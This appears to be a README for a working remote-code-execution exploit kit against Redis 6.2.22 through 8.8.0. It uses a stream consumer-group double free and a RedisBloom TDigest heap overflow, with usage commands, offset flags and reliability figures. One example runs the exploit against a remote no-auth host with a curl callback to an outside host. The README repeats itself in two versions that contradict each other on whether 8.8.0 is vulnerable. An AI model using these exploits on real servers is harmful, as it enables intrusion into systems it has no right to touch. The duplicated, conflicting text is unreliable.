# Redis Authenticated RCE (stream NACK double free + TDigest heap overflow)

Non-destructive RCE exploits for **Redis 6.2.22, 7.4.9, 8.6.4** via the
stream consumer-group shared-NACK double free, and for **8.8.0** via a
newly found TDigest heap-overflow in the bundled RedisBloom module
(CVE-2026-25589 incomplete fix family). Each fires one shell command of
your choice as the redis user, then restores the server to full health.

## Files

- `A_exploit_stock.py` — exploit for **6.2.22** (`redis:6.2.22` image)
- `P74_exploit.py` (+ `P74_g2.py`) — exploit for **7.4.9** (`redis:7.4`)
- `P86_exploit.py` — exploit for **8.6.4** (`redis:8.6`)
- `P88W_exploit.py` (+ `P88W_lib.py`, `P88W_corrupt.py`) — exploit for
  **8.8.0** (`redis:8.8.0`, via bundled-module TDigest heap overflow)
- `A_lib.py`, `G2_arbread.py` — shared helpers (must sit next to the exploits)
- `crc64.c/h`, `crcspeed.c/h` — sources for `libcrc64.so` (Redis CRC64,
  needed to build valid `RESTORE` payloads)
- `calibrate.sh` — compute binary offsets for non-official builds
- `P74_loop.sh`, `P86_run.sh` — boot-retry wrappers

## Build (one-time)

```
gcc -shared -fPIC -O2 -o libcrc64.so crc64.c crcspeed.c
```

Requires: Python 3.6+ (no pip packages), gcc.

## Usage

```
# 6.2.22 (DEBUG enabled by default)
python3 A_exploit_stock.py <host> <port> [password] [trigger]

# 7.4.9 / 8.6.4 — stock target, NO debug flag needed
python3 P74_exploit.py <host> <port> [password] [trigger]
python3 P86_exploit.py <host> <port> [password] [trigger]

# 8.8.0 — stock target, FRESH container/instance strongly recommended
python3 P88W_exploit.py <host> <port> [password] [trigger]
```

- `password` — omit (or pass `""`) for no-auth targets
- `trigger` — shell command, default writes proof under `/data/pwned*`

Examples:

```
# local lab, 6.2.22
docker run -d -p 6379:6379 redis:6.2.22 redis-server --requirepass exploitme
python3 A_exploit_stock.py 127.0.0.1 6379 exploitme "id > /data/pwned_stock"

# local lab, 7.4.9
docker run -d -p 6379:6379 redis:7.4 redis-server --requirepass exploitme
python3 P74_exploit.py 127.0.0.1 6379 exploitme "id > /data/pwned74"

# local lab, 8.6.4
docker run -d -p 6379:6379 redis:8.6 redis-server --requirepass exploitme
python3 P86_exploit.py 127.0.0.1 6379 exploitme "id > /data/pwned86"

# local lab, 8.8.0
docker run -d -p 6379:6379 redis:8.8.0 redis-server --requirepass exploitme
python3 P88W_exploit.py 127.0.0.1 6379 exploitme "id > /data/pwned88"
```

## Target requirements

- **6.2.22**: official-image offsets by default. For other builds,
  override offsets (`--str-format-off` etc.; see `--help`), or run
  `./calibrate.sh /path/to/redis-server [/path/to/libc.so.6]` to generate
  them. **Wrong offsets crash the target server** (out-of-range reads).
- **7.4.9 / 8.6.4 / 8.8.0**: stock official images, **no debug flag needed**.
- Commands available to the user: `EVAL`, `RESTORE`, `XGROUP`
  (8.8.0 also needs the bundled RedisBloom module, present by default).
- **8.8.0 exploit is layout-sensitive**: it sprays tdigests to build a
  deterministic jemalloc corridor — use a fresh instance with no other
  clients/commands interleaved.

## Notes

- Reliability: 6.2.22 10/10, 7.4.9 5/5, 8.6.4 25/25, 8.8.0 5/5 validated
  on fresh containers. Failures abort cleanly; re-run or use wrappers.
- Post-run residue (deliberate, inert): a handful of exploit keys that
  keep double-freed chunks alive; see `HARDENING.md` for details.
  The 8.8.0 exploit leaves ~2000 zeroed tdigest structs + a corrupted
  oracle key — do not FLUSHALL/SAVE the target afterwards.
- The shared-NACK double free is fixed only in **8.8.0** (PR #15081);
  the 8.8.0 exploit instead uses a separate, unfixed bundled-module bug.

For authorized testing only.

## Files

- `A_exploit_stock.py` — exploit for **6.2.22** (`redis:6.2.22` image)
- `P74_exploit.py` (+ `P74_g2.py`) — exploit for **7.4.9** (`redis:7.4`)
- `P86_exploit.py` — exploit for **8.6.4** (`redis:8.6`)
- `A_lib.py`, `G2_arbread.py` — shared helpers (must sit next to the exploits)
- `crc64.c/h`, `crcspeed.c/h` — sources for `libcrc64.so` (Redis CRC64,
  needed to build valid `RESTORE` payloads)
- `calibrate.sh` — compute binary offsets for non-official builds
- `P74_loop.sh`, `P86_run.sh` — boot-retry wrappers

## Build (one-time)

```
gcc -shared -fPIC -O2 -o libcrc64.so crc64.c crcspeed.c
```

Requires: Python 3.6+ (no pip packages), gcc.

## Usage

```
# 6.2.22 (DEBUG enabled by default)
python3 A_exploit_stock.py <host> <port> [password] [trigger]

# 7.4.9 / 8.6.4 — stock target, NO debug flag needed
python3 P74_exploit.py <host> <port> [password] [trigger]
python3 P86_exploit.py <host> <port> [password] [trigger]
```

- `password` — omit (or pass `""`) for no-auth targets
- `trigger` — shell command, default writes proof under `/data/pwned*`

Examples:

```
# local lab, 6.2.22
docker run -d -p 6379:6379 redis:6.2.22 redis-server --requirepass exploitme
python3 A_exploit_stock.py 127.0.0.1 6379 exploitme "id > /data/pwned_stock"

# local lab, 7.4.9
docker run -d -p 6379:6379 redis:7.4 redis-server --requirepass exploitme
python3 P74_exploit.py 127.0.0.1 6379 exploitme "id > /data/pwned74"

# local lab, 8.6.4
docker run -d -p 6379:6379 redis:8.6 redis-server --requirepass exploitme
python3 P86_exploit.py 127.0.0.1 6379 exploitme "id > /data/pwned86"

# remote, no auth
python3 P86_exploit.py 10.0.0.5 6379 "" "curl http://me.example/cb"
```

## Target requirements

- **6.2.22**: official-image offsets by default. For other builds,
  override offsets (`--str-format-off`, `--got-write-off`,
  `--libc-write-off`, `--libc-system-off`, `--server-off`,
  `--db-dicttype-off`, `--dictsdskeycompare-off`; see `--help`), or run
  `./calibrate.sh /path/to/redis-server [/path/to/libc.so.6]` to generate
  them. **Wrong offsets crash the target server** (out-of-range reads) —
  calibrate first if the binary differs from the official image.
- **7.4.9 / 8.6.4**: stock official images, **no debug flag needed**
  (exploits are fully DEBUG-free since the de-DEBUG rework).
- Commands available to the user: `EVAL`, `RESTORE`, `XGROUP`.

## Notes

- Reliability: 6.2.22 ~85–100%/boot, 7.4.9 5/5 validated, 8.6.4 25/25
  validated — failures abort cleanly; re-run or use the wrapper scripts.
- Post-run residue (deliberate, inert): a handful of exploit keys that
  keep double-freed chunks alive; see `HARDENING.md` for details.
  6.2.22 also leaves ~210 filler keys on ~40% of boots ("phantom used
  count" handling).
- **8.8.0+ is NOT vulnerable** (upstream PR #15081 rejects shared NACKs).

For authorized testing only.
